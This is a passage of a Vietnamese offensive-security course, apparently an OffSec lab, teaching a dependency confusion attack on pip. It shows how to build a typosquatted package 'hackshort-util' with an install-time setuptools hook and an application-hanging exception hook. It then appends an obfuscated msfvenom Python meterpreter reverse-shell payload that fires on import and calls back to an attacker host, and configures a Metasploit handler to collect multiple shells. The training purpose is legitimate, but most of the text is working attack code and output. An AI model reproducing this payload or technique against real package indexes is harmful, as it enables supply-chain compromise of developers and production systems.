Để tải package, chúng ta sẽ dùng **pip** với tùy chọn **download**. Chúng ta sẽ chỉ định package **hackshort-util** mà chúng ta tìm thấy trong bài viết trên diễn đàn.

```
kali@kali:~$ pip download hackshort-util
Looking in indexes: http://pypi.offseclab.io
ERROR: Could not find a version that satisfies the requirement hackshort-util (from versions: none)
ERROR: No matching distribution found for hackshort-util
```

                                          *Listing 51 - Thử tải Python package hackshort-util*

Như được hiển thị, chúng ta không tìm thấy package này. Điều này có nghĩa là chúng ta nên thử khai thác một cuộc tấn công **dependency chain**.

---

# **9. Dependency Chain Attack**

---

Các cuộc tấn công dependency chain (đôi khi còn được gọi là **dependency confusion**, **dependency hijacking**, hoặc **substitution attacks**) là các cuộc tấn công trong đó người dùng hoặc package manager tải về một package độc hại thay vì package dự định. Điều này có thể xảy ra khi một package có cùng tên nhưng được liệt kê trong một repository khác, bằng cách typosquatting tên của tổ chức, hoặc typosquatting một lỗi chính tả phổ biến.

Mặc dù typosquatting là một vector tấn công hợp lệ, chúng ta sẽ tập trung vào sự nhầm lẫn mà một package manager có thể gặp phải khi tồn tại nhiều package có cùng tên.

Nhóm tấn công này có thể dẫn đến các vi phạm bảo mật tiềm ẩn, rò rỉ dữ liệu, và thực thi mã tùy ý trong ứng dụng.

Learning Unit này bao gồm các Learning Objective sau:

- Hiểu rõ cuộc tấn công
- Phát hành một package độc hại

---

## 9.1. Hiểu về Cuộc tấn công

---

Ý tưởng cốt lõi đằng sau một cuộc tấn công dependency chain là các package manager, như **Python Package Index (PyPI)** cho Python và **Node Package Manager (NPM)** cho JavaScript, sẽ ưu tiên một số repository hoặc version của một package khi cài đặt. Ví dụ, một public repository chính thức hoặc một version mới hơn của package có thể được ưu tiên hơn các repository tùy chỉnh. Tuy nhiên, các public repository thường cho phép bất kỳ user nào phát hành package tùy chỉnh với bất kỳ version nào, miễn là tên package chưa được sử dụng.

Điều này có nghĩa là nếu một ứng dụng yêu cầu một package cụ thể từ một internal repository tùy chỉnh, kẻ tấn công có thể upload một package độc hại lên public repository với số version cao hơn. Khi đó, package manager có thể ưu tiên package độc hại thay vì package nội bộ chính thức.

Sơ đồ sau minh họa điều gì xảy ra khi một package manager kiểm tra nhiều repository, không tìm thấy package trong public repository, và sau đó sẽ tải package được tìm thấy trong private repository:

![image.png](image%2021.png)

                                    *Hình 22: Luồng tải khi Public Repo không chứa Package*

Tuy nhiên, nếu public repository có chứa package, package manager vẫn sẽ kiểm tra cả hai repository, nhưng sẽ sử dụng package có version mới nhất, tùy thuộc vào yêu cầu (chúng ta sẽ đề cập thêm về điều này sau).

![image.png](image%2022.png)

                                            *Hình 23: Luồng tải khi Public Repo có chứa Package*

Mỗi package manager có phong cách cấu hình và cơ chế ưu tiên riêng. Vì mục tiêu trong lab này sử dụng Python, chúng ta sẽ tập trung vào **pip**. Có hai cấu hình trong pip có thể thay đổi hoặc thêm repository vào quá trình tìm kiếm. Cấu hình đầu tiên là **index-url**, đây là index mặc định dùng để tìm kiếm. Theo mặc định, nó trỏ tới public index tại [**https://pypi.org/simple**](https://pypi.org/simple). Cấu hình còn lại là **extra-index-url**, dùng để thêm các index bổ sung để tìm kiếm.

Đối với pip, cuộc tấn công dependency chain tồn tại cụ thể do cấu hình **extra-index-url**. Khi một administrator thay đổi default index bằng **index-url**, chỉ index URL đã cấu hình mới được tìm kiếm. Tuy nhiên, khi thêm các custom repository bổ sung bằng **extra-index-url**, nhiều repository sẽ được tìm kiếm, bao gồm cả public repository mặc định. Nếu nhiều repository có cùng một package, repository có version cao nhất phù hợp với tiêu chí sẽ được chọn.

Chúng ta sẽ không biết liệu cấu hình pip của mục tiêu đang dùng **extra-index-url** để thêm các custom repository hay đang dùng **index-url** để thay thế default index cho đến khi chúng ta thử tấn công. Tuy nhiên, vì mỗi developer và mỗi môi trường đều cần cấu hình này, chúng ta có khả năng cao rằng ít nhất một trong số họ đang dùng **extra-index-url**.

Chúng ta cũng cần khớp với versioning mà ứng dụng mục tiêu đang yêu cầu. Mỗi package manager xử lý yêu cầu version khác nhau, nhưng dưới đây là một số ví dụ về các version specifier trong pip:

- **==**: Đây là mệnh đề khớp version. Ví dụ, nếu package được yêu cầu là `some-package==1.0.0`, chỉ version 1.0.0 sẽ được tải. Cần lưu ý rằng có thể dùng wildcard, vì vậy `some-package==1.0.*` cũng sẽ khớp với 1.0.0, 1.0.1, v.v.
- **<=**: Mệnh đề khớp version này sẽ khớp với bất kỳ version nào nhỏ hơn hoặc bằng version được chỉ định. Ví dụ, nếu yêu cầu `some-package<=1.0.0`, thì các version 1.0.0, 0.0.9 và 0.8.9 sẽ khớp, nhưng 1.0.1 và 7.0.2 thì không.
- **>=**: Mệnh đề khớp version này sẽ khớp với bất kỳ version nào lớn hơn hoặc bằng version được chỉ định. Đây là đối lập của mệnh đề **<=**.
- **~=**: Đây là mệnh đề **compatible release**, sẽ tải bất kỳ version nào được cho là tương thích với version được yêu cầu. Điều này giả định rằng developer versioning package theo đúng đặc tả. Ví dụ, nếu yêu cầu `some-package~=1.0.0`, thì 1.0.1, 1.0.5 và 1.0.9 đều sẽ khớp, nhưng 1.2.0 và 2.0.0 thì không.

Trong bài viết trên diễn đàn, chúng ta tìm thấy dòng requirement sau cho **hackshort-utils**:

```
hackshort-util~=1.1.0
```

                                   *Listing 52 - Version Specifier cho requirement hackshort-util*

Trong bài viết trên diễn đàn, file **requirements.txt** sử dụng mệnh đề compatible release cho version 1.1.0. Điều này có nghĩa là chúng ta sẽ cần tạo version cao hơn, nhưng chỉ sau chữ số thập phân thứ hai - **1.1.2** trở lên.

Chúng ta cũng thấy một đoạn ngắn cho biết package được import như thế nào khi nó được load vào ứng dụng trong bài viết trên diễn đàn:

```
from hackshort_util import utils
```

                                   *Listing 53 - Import utils Submodule từ hackshort-util Package*

Cần lưu ý rằng trong quá trình import, package được tham chiếu bằng dấu gạch dưới thay vì dấu gạch ngang (**hackshort_util** thay vì **hackshort-util**). Điều này là do dấu gạch ngang gây ra vấn đề trong cú pháp Python. Khi developer đặt dấu gạch ngang trong tên package, họ thường thay thế nó bằng dấu gạch dưới, như được minh họa trong Listing trên. Chúng ta có thể kết luận rằng **hackshort_util** rất có thể xuất phát từ package **hackshort-util**. Chúng ta cũng ghi nhận rằng submodule **utils** được import từ package này.

---

## 9.2. Tạo Gói Tin Độc Hại Của Chúng Ta

---

Bây giờ khi chúng ta đã biết tên của package, cách nó được import, và phiên bản package mà chúng ta nên thử sử dụng, bước tiếp theo là xây dựng và phát hành package lên pypi.offseclab.io. Ở mức tối thiểu, một Python package thường bao gồm hai file và hai thư mục.

```
└── hackshort-util
    ├── setup.py
    └── hackshort_util
        └── __init__.py
```

                                             *Listing 54 - Cấu Trúc của một Python Package*

Thư mục gốc sẽ mang tên của package, trong trường hợp này là `hackshort-util`.

Trong thư mục đó, chúng ta sẽ tìm thấy `setup.py`, đây là script cài đặt. Script này sẽ build, phân phối và cài đặt module bằng setuptools. Trong file này, chúng ta sẽ định nghĩa package và cách cài đặt nó.

Thay vì `setup.py`, chúng ta cũng có thể sử dụng `pyproject.toml` hoặc `setup.cfg`.

Tiếp theo, chúng ta có thư mục `hackshort_util`. Như đã đề cập trước đó, cú pháp Python không xử lý tốt dấu gạch ngang trong tên package, vì vậy dấu gạch ngang được thay thế bằng dấu gạch dưới. Đây sẽ là tên được sử dụng khi import module vào một ứng dụng. Như chúng ta đã tìm thấy trong bài đăng trên diễn đàn, tên module là `hackshort_util`.

Cuối cùng, chúng ta có file `__**init**.py__`. File này được sử dụng để chỉ ra rằng thư mục là một Python module. Mặc dù không còn cần thiết nếu sử dụng namespace package, nhưng chúng ta sẽ tạo một regular package, và loại này thì yêu cầu file này.

Hãy tạo một Python package rất cơ bản mà chúng ta có thể cài đặt cục bộ để kiểm tra. Chúng ta sẽ tạo thư mục `hackshort-util` và thư mục con `hackshort_util` bằng mkdir. Tiếp theo, chúng ta có thể tạo `setup.py` bằng nano. Cuối cùng, chúng ta sẽ dùng touch để tạo một file `__**init**.py__` rỗng.

```
kali@kali:~$ mkdir hackshort-util

kali@kali:~$ cd hackshort-util                                                                                
kali@kali:~/hackshort-util$ nano setup.py

kali@kali:~/hackshort-util$ cat -n setup.py
01  from setuptools import setup, find_packages
02
03  setup(
04      name='hackshort-util',
05      version='1.1.4',
06      packages=find_packages(),
07      classifiers=[],
08      install_requires=[],
09      tests_require=[],
10  )

kali@kali:~/hackshort-util$ mkdir hackshort_util

kali@kali:~/hackshort-util$ touch hackshort_util/__init__.py
```

                                                *Listing 55 - Tạo Python Package Cơ Bản Nhất*

Mặc dù cấu trúc thư mục là quan trọng, file `setup.py` mới là thành phần chính. Hãy xem lại nội dung của nó.

Ở dòng 1, chúng ta import các hàm cần thiết từ `setuptools`. Ở các dòng 3–10, chúng ta gọi hàm `setup` với nhiều đối số làm cấu hình cho package. Dòng 4 cấu hình tên; tên này cần phải khớp với tên package mà chúng ta đang nhắm tới. Đây là tên sẽ được tham chiếu trên PyPI server, chứ không phải khi import, vì vậy việc sử dụng dấu gạch ngang là hợp lệ. Tiếp theo, ở dòng 5, chúng ta cấu hình phiên bản.

Để package của chúng ta được tải xuống, việc so sánh phiên bản tại thời điểm cài đặt phải cao hơn phiên bản đã được cài đặt trong repository cục bộ, nhưng không được quá cao, nếu không nó cũng sẽ không được tải xuống. Dựa trên thông tin chúng ta đã tìm thấy trước đó, chúng ta chọn phiên bản 1.1.4. Dòng 6 cấu hình cách các package được tìm thấy khi import. Hàm `find_packages` là một hàm mặc định để tìm kiếm cấu trúc thư mục chứa các file.

Tại thời điểm này, chúng ta đã có mức tối thiểu cần thiết để build và sử dụng một package mà không gặp lỗi. Hãy chạy `setup.py` với đối số sdist để tạo một Source Distribution.

Source distribution là một tập hợp tất cả các file tạo nên một Python package.

```
kali@kali:~/hackshort-util$ python3 ./setup.py sdist
running sdist
running egg_info
writing hackshort_util.egg-info/PKG-INFO
writing dependency_links to hackshort_util.egg-info/dependency_links.txt
writing top-level names to hackshort_util.egg-info/top_level.txt
reading manifest file 'hackshort_util.egg-info/SOURCES.txt'
writing manifest file 'hackshort_util.egg-info/SOURCES.txt'
warning: sdist: standard file not found: should have one of README, README.rst, README.txt, README.md

running check
creating hackshort-util-1.1.4
creating hackshort-util-1.1.4/hackshort_util
creating hackshort-util-1.1.4/hackshort_util.egg-info
copying files to hackshort-util-1.1.4...
copying setup.py -> hackshort-util-1.1.4
copying hackshort_util/__init__.py -> hackshort-util-1.1.4/hackshort_util
copying hackshort_util/utils.py -> hackshort-util-1.1.4/hackshort_util
copying hackshort_util.egg-info/PKG-INFO -> hackshort-util-1.1.4/hackshort_util.egg-info
copying hackshort_util.egg-info/SOURCES.txt -> hackshort-util-1.1.4/hackshort_util.egg-info
copying hackshort_util.egg-info/dependency_links.txt -> hackshort-util-1.1.4/hackshort_util.egg-info
copying hackshort_util.egg-info/top_level.txt -> hackshort-util-1.1.4/hackshort_util.egg-info
Writing hackshort-util-1.1.4/setup.cfg
Creating tar archive
removing 'hackshort-util-1.1.4' (and everything under it)
```

                                            *Listing 56 - Chạy Python Package Vừa Được Tạo*

Khi chúng ta chạy lệnh này, Python đã đóng gói toàn bộ source của package tùy chỉnh của chúng ta. Nó cũng tạo ra nhiều file metadata khác nhau (egg-info); tuy nhiên, những file này không quan trọng với chúng ta. Package thực tế được lưu trong thư mục dist với tên hackshort-util-1.1.4.tar.gz.

Hãy sử dụng pip install để cài đặt package của chúng ta và kiểm tra xem nó có hoạt động không. Thay vì cung cấp cho pip tên package để tìm kiếm trong các repository từ xa, chúng ta sẽ cung cấp trực tiếp đường dẫn file hệ thống tới package của mình.

```
kali@kali:~/hackshort-util$ pip install ./dist/hackshort-util-1.1.4.tar.gz
Defaulting to user installation because normal site-packages is not writeable
Looking in indexes: http://pypi.offseclab.io, http://127.0.0.1
Processing ./dist/hackshort-util-1.1.4.tar.gz
  Preparing metadata (setup.py) ... done
Building wheels for collected packages: hackshort-util
  Building wheel for hackshort-util (setup.py) ... done
  Created wheel for hackshort-util: filename=hackshort_util-1.1.4-py3-none-any.whl size=1188 sha256=2b00a9631c7fb9e1094b6c6ac70bd4424f1ecc3110e05dc89b6352229ed58f93
  Stored in directory: /home/kali/.cache/pip/wheels/da/63/05/afd9e305b95f17a67a64eaa1e62f8acfd4fe458712853c2c3d
Successfully built hackshort-util
Installing collected packages: hackshort-util
Successfully installed hackshort-util-1.1.4

```

                                                 *Listing 57 - Cài Đặt hackshort-util Cục Bộ*

Quá trình cài đặt đã thành công! Tiếp theo, chúng ta sẽ thử import `hackshort_util`. Mặc dù package này không chứa gì có giá trị, chúng ta vẫn có thể import nó. Tuy nhiên, nếu chúng ta cố gắng import package `hackshort_util` từ thư mục hiện tại, thư mục hackshort_util tại chỗ sẽ được sử dụng thay vì package mà chúng ta vừa cài đặt. Thay vào đó, chúng ta sẽ mở một tab terminal mới và chạy python3 từ thư mục home. Mặc dù đây là một chi tiết nhỏ, vì source về cơ bản là giống nhau, nhưng chúng ta luôn muốn chắc chắn rằng mình đang kiểm tra bản build trong trường hợp có thứ gì đó bị cấu hình sai.

```
kali@kali:~$ python3                                       
Python 3.11.2 [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import hackshort_util
>>> print(hackshort_util)
<module 'hackshort_util' from '/home/kali/.local/lib/python3.11/site-packages/hackshort_util/__init__.py'>
```

                                          *Listing 58 - Import và Sử Dụng hackshort_util Package*

Như đã thấy, chúng ta đã có thể cài đặt và sử dụng module của mình!

Tiếp theo, chúng ta cần làm cho package trở nên hữu ích hơn để dẫn đến việc thực thi mã. Trước tiên, hãy gỡ cài đặt package để có thể cài đặt lại nó với các cập nhật sau này. Chúng ta sẽ làm điều này bằng cách chạy pip uninstall, nhưng lần này chúng ta phải cung cấp tên package là hackshort-util.

```
kali@kali:~/hackshort-util$ pip uninstall hackshort-util                   
Found existing installation: hackshort-util 1.1.4
Uninstalling hackshort-util-1.1.4:
  Would remove:
    /home/kali/.local/lib/python3.11/site-packages/hackshort_util-1.1.4.dist-info/*
    /home/kali/.local/lib/python3.11/site-packages/hackshort_util/*
Proceed (Y/n)? Y
  Successfully uninstalled hackshort-util-1.1.4
```

                                                    *Listing 59 - Gỡ Cài Đặt hackshort-util Package*

Khi package đã được gỡ cài đặt, chúng ta đã sẵn sàng để tiếp tục.

---

## 9.3. Thực thi lệnh Trong quá trình Cài đặt

---

Bây giờ chúng ta có hai vị trí nơi có thể đặt payload. Vị trí thứ nhất là trong `setup.py`. Nếu đặt payload tại đây, chúng ta có thể đạt được việc thực thi lệnh trong quá trình cài đặt package. Tùy chọn này rất có khả năng sẽ dẫn đến thực thi lệnh trong thời điểm build.

Tùy chọn thứ hai là trong submodule `utils`, mà chúng ta đã phát hiện là đang được sử dụng dựa trên bài đăng trên diễn đàn. Với tùy chọn thứ hai này, chúng ta sẽ phải tạo một file `utils.py`. Việc đặt payload tại đây rất có khả năng sẽ dẫn đến thực thi lệnh trong nhiều môi trường khác nhau, bao gồm cả môi trường production.

Trong thực tế, rất có thể chúng ta sẽ thực hiện cả hai tùy chọn để phủ được phạm vi rộng hơn. Tuy nhiên, đối với phần minh họa này, mục tiêu của chúng ta chỉ là đạt được việc thực thi mã trong production. Dẫu vậy, chúng ta vẫn sẽ trình bày việc thực thi mã cơ bản với tùy chọn thứ nhất và để việc lấy shell trong môi trường build như một bài tập độc lập.

Như đã đề cập, chúng ta cần chỉnh sửa file `setup.py`. Một số package yêu cầu một quá trình cài đặt rất phức tạp, bao gồm cả việc biên dịch. Để phục vụ cho việc này, `setuptools` hỗ trợ một tính năng cho phép chúng ta chỉ định một hàm cài đặt tùy chỉnh để chạy trong thời điểm cài đặt, có tên là `cmdclass`.

```
kali@kali:~/hackshort-util$ cat -n setup.py            
01  from setuptools import setup, find_packages
02  from setuptools.command.install import install
03
04  class Installer(install):
05      def run(self):
06          install.run(self)
07          with open('/tmp/running_during_install', 'w') as f:
08              f.write('This code was executed when the package was installed')
09
10  setup(
11      name='hackshort-util',
12      version='1.1.4',
13      packages=find_packages(),
14      classifiers=[],
15      install_requires=[],
16      tests_require=[],
17      cmdclass={'install': Installer}
18  )
19
```

                             *Listing 60 - Thêm Mã Tùy Chỉnh Để Chạy Trong Quá Trình Cài Đặt*

Ở dòng 17, chúng ta thêm một đối số cmdclass mới vào hàm setup, và nó được gán giá trị là một dictionary. Key install được sử dụng ở đây là bắt buộc để chỉ dẫn pip sử dụng một class cụ thể trong quá trình cài đặt. Trong ví dụ này, chúng ta liên kết nó với class Installer, được định nghĩa ở các dòng 4-8.

Class Installer chấp nhận một biến sẽ được truyền vào bởi `setuptools` khi class này được khởi tạo. Để điều này hoạt động, chúng ta cần import submodule `install`, có thể thấy ở dòng 2. Ở dòng 5, chúng ta chỉ định hàm run sẽ được thực thi trong quá trình cài đặt. Ở dòng 6, chúng ta gọi `install.run(self)`, lệnh này sẽ tiếp tục phần cài đặt thông thường.

Cho đến thời điểm này, mọi thứ chúng ta giải thích đều nhằm tiếp tục quá trình cài đặt như mong đợi. Tuy nhiên, giờ đây chúng ta đã có một vị trí để cấu hình mã tùy chỉnh sẽ được thực thi. Ở các dòng 7 và 8, chúng ta đã thêm một đoạn mã sẽ tạo file `/tmp/running_during_install` để chứng minh rằng chúng ta đã đạt được thực thi lệnh.

Hãy thử cài đặt package này và xác minh rằng lệnh sẽ được thực thi. Trước tiên, chúng ta sẽ xóa package hiện có bằng `rm ./dist/hackshort-util-1.1.4.tar.gz`. Sau đó, chúng ta sẽ kiểm tra để chắc chắn rằng `/tmp/running_during_install` chưa tồn tại. Cuối cùng, chúng ta sẽ build lại package.

```
kali@kali:~/hackshort-util$ rm ./dist/hackshort-util-1.1.4.tar.gz

kali@kali:~/hackshort-util$ cat /tmp/running_during_install   
cat: /tmp/running_during_install: No such file or directory

kali@kali:~/hackshort-util$ python3 ./setup.py sdist                      
...
```

                               *Listing 61 - Xóa Package Hiện Có và Build Package Mới*

Bây giờ khi chúng ta đã build lại package, hãy thử cài đặt nó và kiểm tra xem quá trình cài đặt có tạo ra file của chúng ta hay không.

```
ali@kali:~/hackshort-util$ pip install ./dist/hackshort_util-1.1.4.tar.gz
...

kali@kali:~/hackshort-util$ cat /tmp/running_during_install           
This code was executed when the package was installed   
```

                        *Listing 62 - Cài Đặt Package Mới và Kiểm Tra Việc Thực Thi Mã Tùy Chỉnh*

Tại thời điểm này, chúng ta đã đạt được việc thực thi lệnh trong quá trình cài đặt. Như đã đề cập trước đó, chúng ta sẽ để việc lấy một reverse shell như một bài tập độc lập. Bây giờ, hãy tiếp tục sang việc đạt được thực thi mã trong thời gian chạy (runtime).

---

## 9.4. Thực thi lệnh Trong Thời gian chạy

---

Bây giờ khi chúng ta đã có thực thi mã trong quá trình cài đặt, hãy chuyển sang việc đạt được thực thi mã trong thời gian chạy (runtime). Để làm điều này, chúng ta cần biết các developer sử dụng package như thế nào. Tham chiếu bài đăng trên diễn đàn mà chúng ta đã tìm thấy trước đó, chúng ta sẽ thấy ứng dụng import submodule utils từ hackshort_util.

```
from hackshort_util import utils
```

           *Listing 63 - Đoạn Mã Thể Hiện Việc Import Submodule utils từ Module hackshort_util*

Điều này có nghĩa là chúng ta cần tạo một file `utils.py` trong thư mục hackshort_util, nếu không Python sẽ ném ra lỗi. Tuy nhiên, chúng ta không biết trong submodule này tồn tại những hàm nào, nên khi ứng dụng gọi các hàm đó, nó sẽ ném ra một lỗi khác.

Để khắc phục điều này, chúng ta sẽ tạo một wildcard function sẽ được thực thi bất kể tên hàm là gì.

Dẫu vậy, vẫn có khả năng hàm tiêu chuẩn của chúng ta sẽ không trả về giá trị phù hợp, dẫn đến một exception khác. Để khắc phục, chúng ta sẽ tạo một exception hook để bắt mọi exception mà ứng dụng ném ra và chặn việc thực thi. Mặc dù điều này có thể làm ứng dụng bị crash đối với người dùng, nhưng nó sẽ cho chúng ta thời gian để tiến hành thêm một số trinh sát môi trường.

```
kali@kali:~/hackshort-util$ nano hackshort_util/utils.py
                                                                                                        
kali@kali:~/hackshort-util$ cat -n hackshort_util/utils.py
01  import time
02  import sys
03
04  def standardFunction():
05          pass
06
07  def __getattr__(name):
08          pass
09          return standardFunction
10
11  def catch_exception(exc_type, exc_value, tb):
12      while True:
13          time.sleep(1000)
14
15  sys.excepthook = catch_exception
```

                                           *Listing 64 - Tạo File utils.py với Hàm Exception Hook*

Dòng 1 và 2 sẽ import các thư viện cần thiết. Chúng ta sẽ giữ phần này ở mức cơ bản vì chúng ta không biết mục tiêu đã cài đặt những gì.

Ở các dòng 4-5, chúng ta tạo hàm tiêu chuẩn (standardFunction()) sẽ được thực thi bởi bất kỳ lời gọi hàm nào tới submodule này. Từ khóa pass ở dòng 5 chỉ thị ứng dụng tiếp tục thực thi mà không làm gì cả.

Ở các dòng 7-9, chúng ta sẽ định nghĩa một hàm đặc biệt tên là **getattr** sẽ được gọi khi một tên hàm không tồn tại. Ở dòng 9, chúng ta trả về hàm tiêu chuẩn đã được định nghĩa ở các dòng 4-5, qua đó tạo ra wildcard function của chúng ta.

Ở dòng 11, chúng ta định nghĩa hàm để bắt tất cả exception. Hàm này sẽ nhận ba đối số được truyền vào khi ứng dụng ném ra exception. Ở dòng 12, chúng ta tạo một vòng lặp vô hạn sẽ sleep 1000 giây (dòng 13) trong mỗi vòng lặp.

Cuối cùng, ở dòng 15, chúng ta chỉ định exception hook bằng hàm mà chúng ta vừa định nghĩa.

Hãy gỡ cài đặt package hackshort-util hiện tại, sau đó build lại và cài đặt lại.

```
kali@kali:~/hackshort-util$ pip uninstall hackshort-util
...

kali@kali:~/hackshort-util$ python3 ./setup.py sdist
...

kali@kali:~/hackshort-util$ pip install ./dist/hackshort_util-1.1.4.tar.gz
...
```

                        *Listing 65 - Gỡ Cài Đặt, Build Lại, và Cài Đặt Lại hackshort-util Package*

Tiếp theo, hãy thử sử dụng module trong Python để kiểm tra chức năng chúng ta đã triển khai. Chúng ta sẽ import submodule như đã thể hiện trong bài đăng trên diễn đàn. Sau đó, chúng ta sẽ thử chạy bất kỳ hàm nào và đảm bảo không ném ra lỗi. Cuối cùng, chúng ta sẽ thử chia cho 0 và kỳ vọng bị đưa vào một vòng lặp vô hạn.

```
kali@kali:~$ python3                 
Python 3.11.2 [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from hackshort_util import utils
>>> utils.run()
>>> 1/0
```

                                            *Listing 66 - Kiểm Tra Package Mới Tạo Của Chúng Ta*

Như kỳ vọng, việc chạy bất kỳ hàm nào không ném ra lỗi, và việc chia cho 0 đưa chúng ta vào một vòng lặp vô hạn. Bây giờ khi chúng ta đã có một nền tảng vững chắc, chúng ta có thể thêm payload của mình.

---

## 9.5. Thêm Payload

---

Chúng ta sẽ thêm một payload meterpreter vào package của mình. Điều này cho phép chúng ta có mức độ linh hoạt khá tốt khi thực hiện pivoting. Chúng ta cũng không biết sẽ thu được bao nhiêu reverse shell. Có thể chúng ta chỉ nhận được một shell từ mục tiêu trong môi trường production, nhưng cũng có thể chúng ta đạt được thực thi lệnh trong các môi trường thấp hơn, laptop của developer, và nhiều nơi khác. Việc sử dụng meterpreter shell cho phép chúng ta thu thập nhiều shell nếu cần.

Hãy bắt đầu bằng việc sử dụng msfvenom để tạo payload. Vì package của chúng ta là một Python package, chúng ta sẽ chỉ định rằng chúng ta muốn một payload meterpreter cho Python. Chúng ta muốn mục tiêu kết nối ngược lại với chúng ta, vì vậy chúng ta sẽ sử dụng một kết nối reverse shell. Tất cả những điều này có thể được chỉ định bằng tùy chọn -p. Do payload sẽ là Python chứ không phải một file thực thi nhị phân, chúng ta có thể chỉ định rằng chúng ta muốn output ở định dạng raw bằng cách sử dụng tùy chọn -f. Cuối cùng, chúng ta cần chỉ định địa chỉ IP và số cổng mà payload sẽ kết nối tới. Đối với việc này, chúng ta cần một thứ mà tất cả các nạn nhân đều có thể truy cập được. Mục tiêu dễ truy cập nhất mà chúng ta có là cloud Kali instance của mình, vì vậy đối với LHOST, chúng ta sẽ chỉ định IP của cloud Kali. Đối với LPORT, chúng ta sẽ chỉ định một cổng tùy ý là 4488.

```
kali@kali:~$ msfvenom -f raw -p python/meterpreter/reverse_tcp LHOST=192.88.99.76 LPORT=4488
[-] No platform was selected, choosing Msf::Module::Platform::Python from the payload
[-] No arch selected, selecting arch: python from the payload
No encoder specified, outputting raw payload
Payload size: 436 bytes
exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNo9UE1LxDAQPTe/IrckGMPuUrvtYgURDyIiuHsTWdp01NI0KZmsVsX/7oYsXmZ4b968+ejHyflA0ekBgvw2fSvbBqHIJQZ/0EGGfgTy6jydaW+pb+wb8OVCbEgW/NcxZlinZpUSX8kT3j7e3O+3u6fb6wcRdUo7a0EHztmyWqmyVFWl1gWTeV6WIkpaD81AMpg1TCF6x+EKDcDELwQxddpJHezU6IGzqzsmUXnQHzwX4nnxQrr6hI0gn++9AWrA8k5cmqNdd/ZfPU+0IDCD5vFs1YF24+QBkacPqLbII9lBVMofhmyDv4L8AerjXyE=')[0])))
```

                                                     *Listing 67 - Tạo Python Meterpreter Payload*

Chạy lệnh này sẽ cung cấp cho chúng ta payload. Tiếp theo, chúng ta cần thêm nó vào package của mình. Vì chúng ta muốn có reverse shell trong thời gian chạy (runtime), chúng ta sẽ thêm nó vào cuối file `hackshort_util/utils.py`. Ngay khi ứng dụng import package này, một reverse shell sẽ được gửi đi.

```
kali@kali:~/hackshort-util$ nano hackshort_util/utils.py

kali@kali:~/hackshort-util$ cat -n hackshort_util/utils.py
01  import time
02  import sys
03
04  def standardFunction():
05          pass
06
07  def __getattr__(name):
08          pass
09          return standardFunction
10
11  def catch_exception(exc_type, exc_value, tb):
12      while True:
13          time.sleep(1000)
14
15  sys.excepthook = catch_exception
16
17  exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNo9UE1LxDAQPTe/IrckGMPuUrvtYgURDyIiuHsTWdp01NI0KZmsVsX/7oYsXmZ4b968+ejHyflA0ekBgvw2fSvbBqHIJQZ/0EGGfgTy6jydaW+pb+wb8OVCbEgW/NcxZlinZpUSX8kT3j7e3O+3u6fb6wcRdUo7a0EHztmyWqmyVFWl1gWTeV6WIkpaD81AMpg1TCF6x+EKDcDELwQxddpJHezU6IGzqzsmUXnQHzwX4nnxQrr6hI0gn++9AWrA8k5cmqNdd/ZfPU+0IDCD5vFs1YF24+QBkacPqLbII9lBVMofhmyDv4L8AerjXyE=')[0])))
```

                              *Listing 68 - Chỉnh Sửa File utils.py để Thêm Payload Đã Tạo*

Bây giờ khi chúng ta đã thêm payload, chúng ta cần khởi động listener. Vì chúng ta đã sử dụng IP của cloud Kali instance, chúng ta sẽ SSH vào cloud Kali instance của mình.

```
kali@kali:~$ ssh kali@192.88.99.76
The authenticity of host '192.88.99.76 (192.88.99.76)' can't be established.
ED25519 key fingerprint is SHA256:uw2cM/UTH1lO2xSphPrIBa66w3XqioWiyrWRgHND/WI.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.88.99.76' (ED25519) to the list of known hosts.
kali@192.88.99.76's password: 

kali@cloud-kali:~$
```

                                       *Listing 69 - Đăng Nhập Cloud Kali Instance Qua SSH*

Sau khi đăng nhập, chúng ta cần khởi động Metasploit. Bước đầu tiên là khởi tạo database. Chúng ta có thể làm điều này bằng cách sử dụng lệnh msfdb init. Lệnh này cần được chạy với quyền root, vì vậy hãy thêm sudo vào đầu lệnh.

```
kali@cloud-kali:~$ sudo msfdb init
[+] Starting database
[+] Creating database user 'msf'
[+] Creating databases 'msf'
[+] Creating databases 'msf_test'
[+] Creating configuration file '/usr/share/metasploit-framework/config/database.yml'
[+] Creating initial database schema
```

                                                *Listing 70 - Khởi Tạo Database của Metasploit*

Sau khi được khởi tạo, chúng ta có thể khởi động Metasploit bằng cách chạy msfconsole.

Vì chúng ta đã tạo payload thủ công, chúng ta sẽ sử dụng generic payload handler: `exploit/multi/handler`. Chúng ta sẽ thiết lập LHOST để lắng nghe trên tất cả các interface (0.0.0.0) và đặt LPORT bằng với giá trị chúng ta đã dùng trong cấu hình payload (4488).

Vì chúng ta không biết có thể sẽ thu được bao nhiêu reverse shell, chúng ta cần cấu hình Metasploit để thu thập nhiều reverse shell. Đầu tiên, chúng ta không muốn listener đóng lại ngay khi một reverse shell kết nối. Để ngăn điều này, chúng ta sẽ đặt tùy chọn ExitOnSession thành false. Cuối cùng, chúng ta sẽ chạy listener như một job bằng cách sử dụng -j. Nếu chúng ta bị “ngập” reverse shell, chúng ta không muốn Metasploit ngay lập tức tương tác với chúng. Để cấu hình điều này, chúng ta cũng sẽ sử dụng tùy chọn -z cho lệnh run.

```
kali@cloud-kali:~$ msfconsole
....

msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp

msf6 exploit(multi/handler) > set payload python/meterpreter/reverse_tcp
payload => python/meterpreter/reverse_tcp

msf6 exploit(multi/handler) > set LHOST 0.0.0.0
LHOST => 0.0.0.0

msf6 exploit(multi/handler) > set LPORT 4488
LPORT => 4488

msf6 exploit(multi/handler) > set ExitOnSession false
ExitOnSession => false

msf6 exploit(multi/handler) > run -jz
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
[*] Started reverse TCP handler on 0.0.0.0:4488
```

                                     *Listing 71 - Khởi Động Metasploit và Cấu Hình Handler*

